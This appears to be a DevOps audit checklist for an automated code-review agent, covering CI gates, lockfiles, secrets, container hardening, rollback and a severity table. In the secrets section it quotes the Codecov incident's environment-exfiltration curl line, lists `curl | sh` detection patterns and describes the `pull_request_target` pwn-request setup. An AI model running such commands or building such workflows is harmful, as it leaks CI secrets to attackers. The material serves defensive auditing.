# DevOps

Build, test, and release pipeline. Gate: CI/CD, a Dockerfile, or IaC was detected.

Read the pipeline as code, because it is. The same standards apply: no secrets inline, no unpinned inputs, no silent failure.

## Pipeline integrity

- [ ] The pipeline actually fails the build on test failure, type error, and lint error. `search_code` for `continue-on-error`, `|| true`, and `--passWithNoTests` — each one can turn a red build green. Rule-out: a `continue-on-error` on a genuinely advisory step (a nightly benchmark, an experimental linter) is not a defect; read what the step does before flagging it.
- [ ] Every check that matters locally also runs in CI. Read the scripts declared in `package.json`/`Makefile` and the setup steps in README or CONTRIBUTING, then read the CI workflow's actual step list — a script documented or runnable locally but never invoked by a workflow step is decoration, not a check.
- [ ] The pipeline triggers on the branches and events that matter. Read the workflow's `on:` block and confirm the merge-target branch and the PR event are both present — a workflow that only runs on `push` to `main` never gates the PR that lands there.
- [ ] The workflow's `on:` block does not enumerate a persistent multi-branch topology (`develop`, `release/*`, `hotfix/*`, `staging` alongside `main`) as the normal path to production. `Read` the trigger block already read for the check above; a pipeline built around several long-lived branches is not itself a defect, but it is the opposite of the trunk-based model most CI/CD tooling assumes — trunk-based development means developers "collaborate on code in a single branch called 'trunk' and resist any pressure to create other long-lived development branches" (trunkbaseddevelopment.com, canonical practice reference site, current, https://trunkbaseddevelopment.com/) — and it is worth naming as context for any deployment-frequency or lead-time finding elsewhere in this module. Refuted if the additional branches are short-lived environments recreated per release and deleted immediately after (e.g. an ephemeral `release/x.y.z` branch), not standing long-lived branches — check whether the pattern is a literal name (`develop`) versus a templated one (`release/*`) before concluding a standing branch exists.
- [ ] Required checks are enforced by branch protection — **this is a platform setting, not a file in the repository.** (OpenSSF Scorecard's own `Branch-Protection` check hits the same wall and queries the GitHub API for it rather than reading source — several of the settings it queries, like `EnforceAdmins` and `RequiresStatusChecks`, "require an admin token" to the platform API (OpenSSF, official project documentation, current, https://github.com/ossf/scorecard/blob/main/docs/checks.md).) `search_code` for a ruleset file or `CODEOWNERS` checked into the repo — the only in-repo signal, and even that only proves a rule was declared, not that GitHub enforces it as required. State explicitly that enforcement itself is `undetermined` from source and belongs in `Out of static reach`; this module can confirm only that the check exists and runs.
- [ ] The pipeline records what a delivery-performance metric would need later: a deploy event tagged with the commit SHA and timestamp (a git tag, a GitHub Deployments API call, or an equivalent log line), and a way to tell a rollback/hotfix deploy apart from a forward one. `search_code` for deployment-tagging or Deployments API usage in the deploy job. DORA's 2025 reframing names five delivery metrics — change lead time, deployment frequency, failed-deployment recovery time, change fail rate, deployment rework rate — each computed from exactly this kind of tagged deploy-event data (DORA/Google Cloud, official project site, current, https://dora.dev/guides/dora-metrics-four-keys/). This check does not compute any of the five numbers — it only confirms the pipeline is instrumented so they could be computed from data outside source. Refuted if the signal exists in a system this probe cannot read (the deploy platform's own dashboard, an external release-tracking tool) rather than in the repository — name the tool if one is documented, otherwise report the gap as unconfirmed, not absent.

## Reproducibility

- [ ] Lockfile committed and CI installs from it exactly. `search_code` the CI workflow for the install command — `npm ci`, `yarn install --frozen-lockfile`, `pnpm install --frozen-lockfile` are frozen installs; a bare `npm install`/`yarn install` resolves and can silently drift the lockfile on every run. `npm ci` is built for exactly this: it "will exit with an error, instead of updating the package lock" on any mismatch, and never writes to `package.json` or the lockfile (npm, official CLI documentation, current, https://docs.npmjs.com/cli/v10/commands/npm-ci).
- [ ] Action, image, and tool versions are pinned — owned by `supply-chain.md` (`search_code` workflow files for `uses: <action>@v` without a SHA, and the Dockerfile `FROM` tag vs. digest); reuse its finding, do not re-report. Pinning to a full commit SHA is "currently the only way to use an action as an immutable release" — a tag can be moved or deleted if an attacker gains repository access (GitHub, official platform documentation, current, https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions).
- [ ] Build does not depend on ambient state. Read the workflow for steps referencing paths or tools outside the checked-out repository, and for a self-hosted runner whose pre-installed toolchain the workflow never declares — a hosted-runner workflow that suddenly needs a self-hosted label is the tell.
- [ ] The same artefact that was tested is the one that deploys. Read whether the deploy job downloads the build artefact the test job produced (`actions/upload-artifact` / `download-artifact` or equivalent) or invokes its own separate build step — two independent build invocations across jobs means the tested bits and the shipped bits are not provably identical.

## Secrets in CI

- [ ] No secret in pipeline YAML, build args, or image layers. `search_code` for `secret`, `password`, `token`, `api_key` in workflow files and `Dockerfile`/`docker-compose` build-arg blocks. Rule-out: a hit that is `${{ secrets.X }}` or `${{ env.X }}` interpolation is the secrets manager working correctly; the finding is a literal string assigned where one of those references belongs — read each hit before reporting, do not flag the pattern name alone. This is not a hypothetical: CircleCI's 2023 incident (malware on an engineer's laptop escalating to a stolen SSO session) forced every customer to rotate "customer environment variables, tokens, and keys" (CircleCI, official incident report, 2023, https://circleci.com/blog/jan-4-2023-incident-report/), and Codecov's compromised Bash Uploader script ran `curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)"` inside every CI job that fetched it, exfiltrating environment variables for two months before discovery (Codecov, official security-incident disclosure, 2021, https://about.codecov.io/security-update/).
- [ ] Secrets are not echoed. `search_code` for `set -x` or `ACTIONS_STEP_DEBUG`/`ACTIONS_RUNNER_DEBUG` in steps that also reference `secrets.` — verbose mode prints the resolved command line, secret included. GitHub's own hardening docs warn that "automatic redaction is not guaranteed" for secrets printed to a log, and any secret that leaks into a run log must be treated as compromised and rotated (GitHub, official platform documentation, current, https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions).
- [ ] Pull requests from forks cannot access secrets. Read the workflow trigger: plain `pull_request` never exposes repository secrets to a fork's code, so do not flag it — that is the safe default and a common false alarm. `pull_request_target` combined with checking out the fork's ref (`ref: ${{ github.event.pull_request.head.sha }}`) is the dangerous "pwn request" pattern, because it runs with base-repo secrets against fork-controlled code. GitHub's own docs name `pull_request_target`/`workflow_run` workflows as privileged — they "may have repository write access and access to referenced secrets" and are the documented mechanism repo takeovers exploit (GitHub, official platform documentation, current, https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions).
- [ ] Two distinct platform mitigations narrow this, and neither is a substitute for reading the workflow. **Workflow-source pinning** (effective 2025-12-08): `pull_request_target` now always takes its workflow file and ref from the repository's default branch, regardless of the PR's base branch — this closes the older exploit of smuggling a malicious workflow version onto a stale non-default branch and waiting for it to trigger. **`actions/checkout` v7** (shipped 2026-06-18): blocks and fails a workflow that tries to check out unreviewed fork-PR code under `pull_request_target` or `workflow_run` — this is enforcement at the checkout step itself, not a change to which workflow file runs. Read the workflow's checkout step and its `actions/checkout` version against both dates before deciding which mitigation, if either, applies.
- [ ] The `actions/checkout` v7 enforcement was backported to all other supported majors on 2026-07-20 — v2 through v6 all inherit the fork-checkout block automatically because they're floating tags GitHub repoints. **`v1` was not backported and does not block it.** `search_code` workflow files for `uses: actions/checkout@v1` under a `pull_request_target`/`workflow_run` trigger — that combination is now a concrete, readable finding, not an inference. The block also does not reach a workflow pinned to a fixed commit SHA predating the backport, or one that clones the fork's ref by hand instead of via `actions/checkout` — name which case applies before concluding the repo is covered.
- [ ] `GITHUB_TOKEN`'s default permission is scoped down. `search_code` workflow files for a top-level `permissions:` block; its absence means every job runs with the repository's default token permission (often broad read/write) instead of the minimum each job actually needs. GitHub's own hardening guidance recommends setting the default to read-only content access and escalating per job (GitHub, official platform documentation, current, https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions). Rule-out: a workflow that only reads (checks out code, runs tests with no deploy/comment/label step) is lower risk even without the block, but the block should still exist to make that intent explicit. Refuted if the repository/organization default workflow permission is already set to read-only at the platform level — not visible from source, so a missing `permissions:` block still reports as `Medium` rather than being dropped, since this module cannot confirm which case applies.
- [ ] No CI step or Dockerfile `RUN` pipes a remotely-fetched script straight into a shell with no integrity check. `search_code` for `curl ... | sh`, `curl ... | bash`, `wget -O- ... | sh` in workflow files and Dockerfiles. This is the exact shape of two real incidents: Codecov's Bash Uploader, fetched via `curl | bash` by CI pipelines across GitHub Actions, CircleCI, and other providers, was silently modified for two months in 2021 to exfiltrate every environment variable from any job that ran it (Codecov, official security-incident disclosure, 2021, https://about.codecov.io/security-update/), and CircleCI's own 2023 compromise reached "customer environment variables, tokens, and keys" at scale (CircleCI, official incident report, 2023, https://circleci.com/blog/jan-4-2023-incident-report/). Rule-out: the fetch is over a URL pinned to an immutable release artifact or commit, and its output is checksummed against a value stored in this repository before execution — an install script from a package manager's own documented onboarding flow with no checksum step is still the finding, not an exception. Refuted if the script is vendored into the repository (read from a local path, not fetched at run time) — then there is no remote-tampering window and this is not the same defect class.

## Container hygiene

- [ ] Multi-stage build so build tooling is not in the final image. Read the Dockerfile, count `FROM` stages, and confirm the final stage `COPY --from=` only the build output, never the compiler, package manager cache, or dev dependencies.
- [ ] Runs as a non-root user. `search_code` the Dockerfile for a `USER` directive — its absence means the container runs as root by default, and that is the finding, not an assumption to double-check. Rule out a base image that already declares non-root in an earlier stage or in the `FROM` image itself (a distroless `*-nonroot` variant, e.g. `gcr.io/distroless/static-debian12:nonroot`) — read the base image name/tag before concluding root.
- [ ] Base image is minimal, specific, and updatable. Read the `FROM` line: a distroless, Alpine, or `-slim` variant carries a materially smaller attack surface than a full `ubuntu`/`debian` image with the same tooling available to an attacker post-compromise — name which family is in use. A pinned tag or digest is checkable; `latest` or an untagged reference is not, and "something updates it" needs a Renovate/Dependabot config or equivalent — `search_code` for one.
- [ ] Build context excludes what should not ship. Read the `.dockerignore` file's actual contents — its mere existence proves nothing — and confirm `.git`, `node_modules`, `.env`, and test fixtures are each covered, not assumed covered by a wildcard that does not match them.
- [ ] Healthcheck readiness-vs-liveness is owned by `observability.md` (`search_code` for the health-check handler and `find_symbol` its readiness logic); reuse its finding, do not re-report. This module's own concern is only that a `HEALTHCHECK` directive exists in the Dockerfile at all — `search_code` for its presence.
- [ ] Capabilities are dropped and the root filesystem is read-only wherever the application allows it. `search_code` the Dockerfile, compose file, or Kubernetes manifest for `cap_drop: [ALL]` / `--cap-drop=ALL` and `readOnlyRootFilesystem: true` / `read_only: true`. Their absence means the container keeps the full default Linux capability set and a writable root even after the non-root and multi-stage fixes above — a step past "not root," and the next thing 2026 hardening baselines check for.

## Deploy and rollback

- [ ] A documented rollback path exists. `search_code` docs and runbooks for "rollback" and read the steps. This module can confirm only that a documented path exists, not that it has ever been exercised — whether it actually works under a real failure is `undetermined` from source and belongs in `Out of static reach`.
- [ ] Migrations and code deploys are ordered so a running old version does not break. Cross-reference the destructive-migration check in `database.md`: `Read` migration files for additive-vs-destructive shape (a dropped or renamed column breaks the old version still running against it) and compare against the deploy workflow's ordering of migrate-then-deploy vs deploy-then-migrate.
- [ ] Deploys are atomic or gradual, not partial-and-visible. Read the deployment platform's config — a Kubernetes rolling-update strategy, a blue-green or canary configuration — for the actual cutover mechanism rather than assuming one. A `Recreate` strategy, or a rolling-update with no readiness probe gating traffic, is the finding: it exposes half-updated instances to live traffic instead of cutting over cleanly.
- [ ] Configuration differs from code, so a config change does not require a rebuild. `search_code` for values that should be environment-driven but are hardcoded into source, and cross-reference the declared environment-variable list in `infrastructure.md`.

## Local parity

- [ ] A new contributor can build and test with documented steps that work. Read the setup steps in README or CONTRIBUTING and cross-check each command literally exists in `package.json`/`Makefile` — a documented command that has silently drifted from the actual script name is the finding, and following the steps as written is the probe, not a formality.
- [ ] Local and CI use the same tool versions. `search_code` for `.nvmrc`, `.tool-versions`, or an `engines` field, then compare the version it names against the version pinned in the CI workflow — a mismatch means "works on my machine" is provably possible.
- [ ] Nothing required for development is available only to existing team members. `search_code` setup docs for internal URLs or private registries and check whether an access-request process is documented alongside them; an undocumented internal dependency blocks every new contributor identically.

## What browser observation closes

Applies only when `browser.md` ran; findings here are `observed` and cite the bundle path with a line or step number. `devops.md`'s checks are almost entirely about files a browser session never renders — workflow YAML, Dockerfiles, lockfiles, `.dockerignore` — so the bundle is close to useless for this module; the one row below is the only place a running-app observation touches a devops concern, and even it is a weak, opportunistic signal.

| Artefact | Gap it closes | Observed instance earns |
|---|---|---|
| `network.jsonl` (response headers on the root request), `read_page`/`final-state.md` (rendered footer/about text) | The running app exposes a build/version identifier (response header, `/version` endpoint, or visible footer string) that ties the live deployment back to a specific commit — feeding the "same artefact that was tested is the one that deploys" check in Deploy and rollback. Absence of a visible identifier does not itself prove the wrong artefact is deployed — it only means this module cannot confirm which build is live without one; report as "not observable," not as a mismatch. | Info |

## Out of static reach

- Whether required checks are actually enforced by branch protection — a platform setting invisible to source, not a file.
- Whether a documented rollback procedure has ever been executed successfully — closed by `runtime.md` when execution is enabled and the user explicitly names the rollback script as one of its declared mutation commands.
- True build reproducibility across machines and over time, beyond what pinned versions and lockfiles imply.
- Whether CI secrets are scoped correctly at the provider (environment restrictions, least-privilege service accounts) rather than merely referenced correctly in YAML.
- The `GITHUB_TOKEN`'s real effective scope with no `permissions:` block declared — that depends on an org/repo default this module cannot read from source.
- Whether a remotely-fetched script referenced in CI is unchanged at every future run — this module confirms the pattern exists at audit time, not that the fetched content stays trustworthy after.
- Real autoscaling and deploy-strategy behaviour under production load.
- Whether the pipeline's actual delivery performance meets any DORA benchmark — DORA's 2025 report reframed the classic four metrics into five (deployment frequency, lead time for changes, failed-deployment recovery time, change fail rate, deployment rework rate). This module can confirm the pipeline emits the raw signal those metrics would need (see the deploy-tagging check in Pipeline integrity), not the resulting rate — that needs CI run history and incident data outside source.

## Severity guidance

| Situation | Severity |
|---|---|
| Secret in pipeline config, build arg, or image layer | High |
| CI step or Dockerfile `RUN` pipes a remotely-fetched script into a shell with no integrity check | High |
| `pull_request_target` checks out and runs fork-PR head, with no checkout-level block in effect (`actions/checkout@v1`, a pre-2026-07-20 pinned SHA, or a hand-rolled clone) | High |
| Pipeline cannot fail the build (`\|\| true`, `continue-on-error`) | High |
| Artefact rebuilt between test and deploy | High |
| Container runs as root | High |
| Untested or absent rollback path | High |
| Build depends on ambient developer state | Medium |
| Build context ships `.git` or secrets | Medium |
| Documented local setup that does not work | Medium |
| No capability drop or read-only root filesystem configured | Medium |
| `GITHUB_TOKEN` default permission not scoped down, no top-level `permissions:` block declared | Medium |
| CI trigger config built around long-lived branches instead of a single trunk | Low |
